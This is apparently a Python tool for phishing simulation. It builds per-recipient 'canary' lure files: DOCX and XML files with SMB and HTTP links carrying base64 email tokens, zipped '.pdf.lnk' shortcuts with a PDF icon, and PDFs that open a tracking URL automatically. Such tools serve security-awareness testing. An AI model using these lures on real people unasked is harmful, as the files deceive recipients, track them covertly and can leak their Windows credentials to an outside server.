import base64
import io
import os
import sys
import uuid
import zipfile
import tempfile


from lxml import etree


class Encode:
    def __init__(self, valid_mails):
        self.valid_mails = valid_mails

    def encoding(self):
        encoded = []
        for i in self.valid_mails:
            unique_id = str(uuid.uuid4())
            encoded_email = f'{unique_id}:{base64.b64encode(i.encode()).decode()}'
            encoded.append(encoded_email)
        return encoded

    @staticmethod
    def decoding(encoded):
        decoded = []
        for i in encoded:
            unique_id, encoded_email = i.split(':', 1)
            decoded.append(base64.b64decode(encoded_email.encode()).decode())
        return decoded

class Template:
    def __init__(self, http_server, http_port, smb_server, name, dir_new_templates):
        self.http_server = http_server
        self.http_port = http_port
        self.smb_server = smb_server
        self.name = name
        self.dir_new_templates = dir_new_templates

    def link_changing_xml(self, encoded=None, save=False):
        #if not encoded: # для пустого списка почт
        #    return None # эта херня сломала мне static, переделать

        xml_data_list = []
        file_path = os.path.join('templates', 'template.xml')

        if not save:
            for mail in encoded:
                tree = etree.parse(file_path)
                root = tree.getroot()
                for relationship in root.findall('.//{http://schemas.openxmlformats.org/package/2006/relationships}Relationship'):
                    target = relationship.get('Target')
                    if target == 'smb://127.0.0.1:4444/canary.png':
                        relationship.set('Target', f'\\\\canary\\{self.smb_server}?token={mail}')
                    elif target == 'http://127.0.0.1:4444/canary.png':
                        relationship.set('Target', f'http://{self.http_server}:{self.http_port}?token={mail}')

                xml_bytes = io.BytesIO()
                tree.write(xml_bytes, pretty_print=True, xml_declaration=True, encoding='UTF-8')
                xml_bytes.seek(0)
                xml_data_list.append(xml_bytes)

            return xml_data_list

        else:
            tree = etree.parse(file_path)
            root = tree.getroot()
            for relationship in root.findall('.//{http://schemas.openxmlformats.org/package/2006/relationships}Relationship'):
                target = relationship.get('Target')
                if target == 'smb://127.0.0.1:4444/canary.png':
                    relationship.set('Target', f'\\\\canary\\{self.smb_server}/canary.png')
                elif target == 'http://127.0.0.1:4444/canary.png':
                    relationship.set('Target', f'http://{self.http_server}:{self.http_port}/canary.png')

            output_path = os.path.join(self.dir_new_templates, f'{self.name}')
            tree.write(output_path, pretty_print=True, xml_declaration=True, encoding='UTF-8')
            print(f'File was saved to {self.dir_new_templates}')

            return output_path

    def link_changing_docx(self, encoded=None, save=False):
        docx_path = os.path.join('templates', 'template.docx')
        docx_files = []

        if not save:
            for mail in encoded:
                temp_docx_bytes = io.BytesIO()
                with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                    with zipfile.ZipFile(temp_docx_bytes, 'w') as temp_zip_ref:
                        for item in zip_ref.infolist():
                            if item.filename == 'word/_rels/document.xml.rels':
                                with zip_ref.open(item.filename) as file:
                                    target = file.read().decode('utf-8')
                                    target = target.replace('smb://127.0.0.1:4444/canary.png', f'\\\\canary\\{self.smb_server}?token={mail}')
                                    target = target.replace('http://127.0.0.1:4444/canary.png', f'http://{self.http_server}:{self.http_port}?token={mail}')
                                    temp_zip_ref.writestr(item.filename, target)
                            else:
                                temp_zip_ref.writestr(item, zip_ref.read(item.filename))

                temp_docx_bytes.seek(0)
                docx_files.append(temp_docx_bytes)

            return docx_files

        else:
            output_path = os.path.join(self.dir_new_templates, f'{self.name}')
            with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                with zipfile.ZipFile(output_path, 'w') as temp_zip_ref:
                    for item in zip_ref.infolist():
                        if item.filename == 'word/_rels/document.xml.rels':
                            with zip_ref.open(item.filename) as file:
                                target = file.read().decode('utf-8')
                                target = target.replace('smb://127.0.0.1:4444/canary.png',f'\\\\canary\\{self.smb_server}/canary.png')
                                target = target.replace('http://127.0.0.1:4444/canary.png',f'http://{self.http_server}:{self.http_port}/canary.png')
                                temp_zip_ref.writestr(item.filename, target)
                        else:
                            temp_zip_ref.writestr(item, zip_ref.read(item.filename))

            print(f'File was saved to {self.dir_new_templates}')

            return output_path

    def link_changing_lnk(self, encoded=None, save=False):
        if sys.platform.startswith('win'):
            import win32com.client
            icon_path = os.path.abspath(os.path.join('templates', 'pdf_icon.ico'))
            lnk_files = []

            base_name = self.name.split('.')[0]
            lnk_filename = base_name + '.pdf.lnk'
            zip_filename = base_name + '.zip'

            if not save:
                for mail in encoded:
                    with tempfile.NamedTemporaryFile(suffix='.lnk', delete=False) as temp_lnk:
                        temp_lnk_path = temp_lnk.name

                    shell = win32com.client.Dispatch("WScript.Shell")
                    lnk = shell.CreateShortcut(temp_lnk_path)
                    lnk.TargetPath = f'http://{self.http_server}:{self.http_port}?token={mail}'
                    lnk.IconLocation = icon_path
                    lnk.Save()

                    with open(temp_lnk_path, 'rb') as f:
                        lnk_data = f.read()

                    os.unlink(temp_lnk_path)

                    zip_buffer = io.BytesIO()
                    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                        zip_file.writestr(lnk_filename, lnk_data)

                    zip_buffer.seek(0)
                    lnk_files.append(zip_buffer)

                return lnk_files
        else:
            print('LNK does not generating in Linux yet')

    def link_changing_lnk_static(self):
        if sys.platform.startswith('win'):
            import win32com.client
            icon_path = os.path.abspath(os.path.join('templates', 'pdf_icon.ico'))

            shell = win32com.client.Dispatch('WScript.Shell')

            target = f'http://{self.http_server}:{self.http_port}'
            output_path = os.path.join(self.dir_new_templates, f'{self.name}')

            lnk = shell.CreateShortCut(output_path)

            lnk.TargetPath = target
            lnk.IconLocation = icon_path
            lnk.WorkingDirectory = os.path.dirname(target)

            lnk.save()

            print(f'File was saved to {self.dir_new_templates}')

            return output_path

        else:
            print('LNK does not generating in Linux yet')

    def link_changing_pdf(self, encoded=None, save=False):
        pdf_files = []

        if not save:
            if encoded:
                for mail in encoded:
                    pdf_content = f'''%PDF-1.7
%âãÏÓ

1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
  /OpenAction 3 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /Kids [4 0 R]
  /Count 1
>>
endobj

3 0 obj
<<
  /Type /Action
  /S /URI
  /URI (http://{self.http_server}:{self.http_port}/?token={mail})
>>
endobj

4 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Contents 5 0 R
  /Resources <<
    /Font <<
      /F1 <<
        /Type /Font
        /Subtype /Type1
        /BaseFont /Helvetica
      >>
    >>
  >>
>>
endobj

5 0 obj
<<
  /Length 50
>>
stream
BT
/F1 12 Tf
50 750 Td
(Important Document) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000050 00000 n
0000000090 00000 n
0000000150 00000 n
0000000220 00000 n
trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
300
%%EOF'''

                    temp_pdf_bytes = io.BytesIO()
                    temp_pdf_bytes.write(pdf_content.encode('utf-8'))
                    temp_pdf_bytes.seek(0)
                    pdf_files.append(temp_pdf_bytes)

            return pdf_files

        else:
            pdf_content = f'''%PDF-1.7
%âãÏÓ

1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
  /OpenAction 3 0 R
>>
endobj

2 0 obj
<<
  /Type /Pages
  /Kids [4 0 R]
  /Count 1
>>
endobj

3 0 obj
<<
  /Type /Action
  /S /URI
  /URI (http://{self.http_server}:{self.http_port})
>>
endobj

4 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Contents 5 0 R
  /Resources <<
    /Font <<
      /F1 <<
        /Type /Font
        /Subtype /Type1
        /BaseFont /Helvetica
      >>
    >>
  >>
>>
endobj

5 0 obj
<<
  /Length 50
>>
stream
BT
/F1 12 Tf
50 750 Td
(Important Document) Tj
ET
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000050 00000 n
0000000090 00000 n
0000000150 00000 n
0000000220 00000 n
trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
300
%%EOF'''

            output_path = os.path.join(self.dir_new_templates, self.name)

            with open(output_path, 'wb') as f:
                f.write(pdf_content.encode('utf-8'))

            print(f'File was saved to {self.dir_new_templates}')

            return output_path

    def link_changing_xlsx(self, encoded=None, save=False):
        pass
